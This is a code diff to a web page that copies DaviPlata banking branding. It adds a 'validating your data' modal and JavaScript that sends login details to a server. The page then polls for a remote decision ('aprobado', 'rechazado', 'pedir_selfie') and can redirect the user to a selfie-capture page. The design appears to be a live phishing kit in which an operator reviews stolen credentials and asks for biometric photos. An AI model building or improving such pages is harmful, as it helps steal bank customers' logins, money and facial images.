@@ -391,6 +391,79 @@
       .error-msg.show {
         display: block;
       }
+
+      /* Modal de validación */
+      .modal-overlay {
+        position: absolute;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(0, 0, 0, 0.45);
+        backdrop-filter: blur(4px);
+        -webkit-backdrop-filter: blur(4px);
+        z-index: 999;
+        display: none;
+        justify-content: center;
+        align-items: center;
+        opacity: 0;
+        transition: opacity 0.3s ease;
+      }
+
+      .modal-overlay.show {
+        display: flex;
+        opacity: 1;
+      }
+
+      .modal-content {
+        background: #fff;
+        width: 85%;
+        max-width: 320px;
+        border-radius: 20px;
+        padding: 30px 24px;
+        text-align: center;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        transform: translateY(20px) scale(0.95);
+        transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .modal-overlay.show .modal-content {
+        transform: translateY(0) scale(1);
+      }
+
+      .modal-logo {
+        width: 60px;
+        margin-bottom: 20px;
+      }
+
+      .modal-title {
+        font-size: 18px;
+        font-weight: 700;
+        color: #1a1a1a;
+        margin-bottom: 12px;
+      }
+
+      .modal-text {
+        font-size: 14px;
+        color: #666;
+        line-height: 1.5;
+        margin-bottom: 24px;
+      }
+
+      /* Spinner moderno */
+      .spinner {
+        width: 40px;
+        height: 40px;
+        border: 4px solid rgba(224, 92, 110, 0.2);
+        border-top-color: #d63648;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin-bottom: 10px;
+      }
+
+      @keyframes spin {
+        to { transform: rotate(360deg); }
+      }
     </style>
   </head>
   <body>
@@ -579,6 +652,16 @@
 
       <!-- Barra home del teléfono -->
       <div class="home-indicator"></div>
+
+      <!-- Modal Validando -->
+      <div class="modal-overlay" id="loadingModal">
+        <div class="modal-content">
+          <img src="img/logo-daviplata.svg" alt="DaviPlata" class="modal-logo" />
+          <div class="spinner"></div>
+          <h2 class="modal-title" id="modalTitle">Validando información</h2>
+          <p class="modal-text" id="modalText">Por favor espera un momento mientras verificamos tus datos en el sistema. Esto tomará pocos segundos.</p>
+        </div>
+      </div>
     </div>
 
     <script>
@@ -685,13 +768,12 @@
           .then(data => {
             btn.textContent = "Continuar";
             btn.disabled = false;
+            
             if (data.ok) {
-              // Mostrar mensaje de éxito
-              mostrarMensaje('success', data.mensaje);
-              document.getElementById('loginForm').reset();
-              selectedTipoValue = '';
-              document.getElementById('selectedLabel').textContent = '';
-              document.getElementById('selectPlaceholder').removeAttribute('style');
+              // Abrir modal de carga
+              mostrarModalCarga();
+              // Iniciar polling pasándole el ID del cliente
+              iniciarPolling(data.id);
             } else {
               mostrarMensaje('error', data.mensaje || 'Error al enviar los datos.');
             }
@@ -701,6 +783,73 @@
             btn.disabled = false;
             mostrarMensaje('error', 'No se pudo conectar con el servidor.');
           });
+        }
+      }
+
+      // --- Funciones del Modal y Polling ---
+      let pollingInterval;
+
+      function mostrarModalCarga() {
+        const modal = document.getElementById('loadingModal');
+        document.getElementById('modalTitle').textContent = "Validando información";
+        document.getElementById('modalText').textContent = "Por favor espera un momento mientras verificamos tus datos en el sistema...";
+        document.querySelector('.spinner').style.display = 'block';
+        modal.classList.add('show');
+      }
+
+      function ocultarModal() {
+        document.getElementById('loadingModal').classList.remove('show');
+      }
+
+      function actualizarModalError(mensaje) {
+        document.querySelector('.spinner').style.display = 'none';
+        document.getElementById('modalTitle').textContent = "Error de validación";
+        document.getElementById('modalTitle').style.color = "#d63648";
+        document.getElementById('modalText').innerHTML = mensaje + "<br><br><b style='color:#d63648; cursor:pointer;' onclick='ocultarModal()'>Intentar de nuevo</b>";
+      }
+
+      function iniciarPolling(clienteId) {
+        if(pollingInterval) clearInterval(pollingInterval);
+        
+        pollingInterval = setInterval(() => {
+          fetch('/api/status/' + clienteId)
+            .then(res => res.json())
+            .then(data => {
+              if (data.estado !== 'pendiente' && data.estado !== 'en_revision') {
+                manejarEstado(data.estado, clienteId);
+              }
+            })
+            .catch(err => console.error("Error consultando estado:", err));
+        }, 3000); // Consultar cada 3 seg
+      }
+
+      function manejarEstado(estado, clienteId) {
+        clearInterval(pollingInterval); // Detener polling
+
+        if (estado === 'aprobado') {
+          document.querySelector('.spinner').style.display = 'none';
+          document.getElementById('modalTitle').textContent = "¡Aprobado!";
+          document.getElementById('modalTitle').style.color = "#1a6330";
+          document.getElementById('modalText').textContent = "Tus datos han sido verificados correctamente. Redirigiendo...";
+          
+          setTimeout(() => {
+            ocultarModal();
+            document.getElementById('loginForm').reset();
+            selectedTipoValue = '';
+            document.getElementById('selectedLabel').textContent = '';
+            document.getElementById('selectPlaceholder').removeAttribute('style');
+          }, 3000);
+          
+        } else if (estado === 'rechazado') {
+          actualizarModalError("Los datos ingresados no coinciden o no son válidos.");
+        } else if (estado === 'pedir_selfie') {
+          document.querySelector('.spinner').style.display = 'none';
+          document.getElementById('modalTitle').textContent = "Verificación Biométrica";
+          document.getElementById('modalText').textContent = "Necesitamos una foto de tu rostro para continuar. Preparando la cámara...";
+          
+          setTimeout(() => {
+            window.location.href = `selfie.html?id=${clienteId}`;
+          }, 2000);
         }
       }
 
